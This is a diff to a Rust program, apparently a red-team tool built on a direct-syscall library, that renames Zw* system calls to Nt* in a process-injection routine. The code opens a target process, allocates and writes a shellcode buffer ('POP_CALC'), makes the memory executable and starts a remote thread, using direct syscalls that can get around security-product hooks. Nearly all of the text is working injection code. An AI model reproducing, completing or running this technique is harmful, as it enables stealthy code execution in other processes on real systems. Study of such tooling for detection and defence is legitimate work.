@@ -91,8 +91,8 @@ fn handle_status(str: &str, x: i32) {
 }
 
 fn filter(x: &&Export) -> bool {
-    ["ZwOpenProcess", "ZwAllocateVirtualMemory", "ZwWriteVirtualMemory",
-        "ZwProtectVirtualMemory", "ZwWaitForSingleObject", "ZwClose", "ZwCreateThreadEx"].contains(&x.name.as_str())
+    ["NtOpenProcess", "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
+        "NtProtectVirtualMemory", "NtWaitForSingleObject", "NtClose", "NtCreateThreadEx"].contains(&x.name.as_str())
 }
 
 
@@ -160,7 +160,7 @@ fn inject() {
     // Get a handle to the target process
     unsafe {
         let x = thermite::syscalls::syscall_handler(
-            syscalls["ZwOpenProcess"].clone(),
+            syscalls["NtOpenProcess"].clone(),
             0x4,
             &mut process_handle,
             PROCESS_ALL_ACCESS,
@@ -168,7 +168,7 @@ fn inject() {
             &oa_process,
             &client_id,
         );
-        handle_status("ZwOpenProcess", x);
+        handle_status("NtOpenProcess", x);
     }
     // println!("Process Handle: {:#x?}", process_handle);
 
@@ -176,7 +176,7 @@ fn inject() {
     let mut buf_size: usize = POP_CALC.len();
     unsafe {
         let x = thermite::syscalls::syscall_handler(
-            syscalls["ZwAllocateVirtualMemory"].clone(),
+            syscalls["NtAllocateVirtualMemory"].clone(),
             0x6,
             process_handle,             // [in]      HANDLE    ProcessHandle,
             &mut base_addr,             // [in, out] PVOID     *BaseAddress,
@@ -185,7 +185,7 @@ fn inject() {
             MEM_COMMIT | MEM_RESERVE,   // [in]      ULONG     AllocationType,
             PAGE_READWRITE              // [in]      ULONG     Protect
         );
-        handle_status("ZwAllocateVirtualMemory", x);
+        handle_status("NtAllocateVirtualMemory", x);
     }
     println!("[^-^] Allocated {} bytes of memory", buf_size);
 
@@ -193,7 +193,7 @@ fn inject() {
     let mut bytes_written: usize = 0;
     unsafe {
         let x = thermite::syscalls::syscall_handler(
-            syscalls["ZwWriteVirtualMemory"].clone(),
+            syscalls["NtWriteVirtualMemory"].clone(),
             0x6,
             process_handle,            // [in]              HANDLE    ProcessHandle,
             base_addr,                 // [in]              PVOID     *BaseAddress,
@@ -201,29 +201,29 @@ fn inject() {
             buf_size,                  // [in]              ULONG     NumberOfBytesToWrite,
             &mut bytes_written         // [out, optional]   PULONG    NumberOfBytesWritten ,
         );
-        handle_status("ZwWriteVirtualMemory", x);
+        handle_status("NtWriteVirtualMemory", x);
     }
     println!("[^-^] Successfully written {} bytes in remote memory", buf_size);
 
     // Change protection status of allocated memory to READ+EXECUTE
     unsafe {
         let x = thermite::syscalls::syscall_handler(
-            syscalls["ZwProtectVirtualMemory"].clone(),
+            syscalls["NtProtectVirtualMemory"].clone(),
             0x6,
             process_handle,             // [in]              HANDLE    ProcessHandle,
             &mut base_addr,             // [in, out]         PVOID     *BaseAddress,
-            &mut buf_size,              // [in, out]         PULONG    NumberOfBytesToProtect,
+            &mut bytes_written,              // [in, out]         PULONG    NumberOfBytesToProtect,
             PAGE_EXECUTE_READ,          // [in]              ULONG     NewAccessProtection,
             &mut PAGE_READWRITE         // [out]             PULONG    OldAccessProtection  ,
         );
-        handle_status("ZwProtectVirtualMemory", x);
+        handle_status("NtProtectVirtualMemory", x);
     }
 
     // Create a remote thread in target process
     unsafe {
         // FIXME: Why does it return STATUS_NO_MEMORY?
         let x = thermite::syscalls::syscall_handler(
-            syscalls["ZwCreateThreadEx"].clone(),
+            syscalls["NtCreateThreadEx"].clone(),
             0xb,
             &mut thread_handle,   // [out]   PHANDLE                 hThread,
             GENERIC_ALL,      // [in]    ACCESS_MASK             DesiredAccess,
@@ -238,30 +238,30 @@ fn inject() {
             0,                    // [in]    ULONG                   SizeOfStackReserve,
             0 as Pvoid,                    // [out]   LPVOID                  lpBytesBuffer,
         );
-        handle_status("ZwCreateThreadEx", x);
+        handle_status("NtCreateThreadEx", x);
     }
 
     // Wait for the thread to execute
     unsafe {
         let x = thermite::syscalls::syscall_handler(
-            syscalls["ZwWaitForSingleObject"].clone(),
+            syscalls["NtWaitForSingleObject"].clone(),
             0x3,
             thread_handle,      //  [in] HANDLE         Handle,
             0,                  //  [in] BOOLEAN        Alertable,
             &(0u64),            //  [in] PLARGE_INTEGER Timeout
 
         );
-        handle_status("ZwWaitForSingleObject", x);
+        handle_status("NtWaitForSingleObject", x);
     }
 
     // Close the handle
     unsafe {
         let x = thermite::syscalls::syscall_handler(
-            syscalls["ZwClose"].clone(),
+            syscalls["NtClose"].clone(),
             0x1,
             thread_handle,      //  [in] HANDLE         Handle,
         );
-        handle_status("ZwClose", x);
+        handle_status("NtClose", x);
     }
 }
 
@@ -295,7 +295,7 @@ fn exec() {
     let mut buf_size: usize = POP_CALC.len();
     unsafe {
         let x = thermite::syscalls::syscall_handler(
-            syscalls["ZwAllocateVirtualMemory"].clone(),
+            syscalls["NtAllocateVirtualMemory"].clone(),
             0x6,
             // process_handle,             // [in]      HANDLE    ProcessHandle,
             // &mut base_addr,             // [in, out] PVOID     *BaseAddress,
@@ -304,7 +304,7 @@ fn exec() {
             // MEM_COMMIT | MEM_RESERVE,   // [in]      ULONG     AllocationType,
             // PAGE_READWRITE              // [in]      ULONG     Protect
         );
-        handle_status("ZwAllocateVirtualMemory", x);
+        handle_status("NtAllocateVirtualMemory", x);
     }
     println!("[^-^] Allocated {} bytes of memory", buf_size);
 }
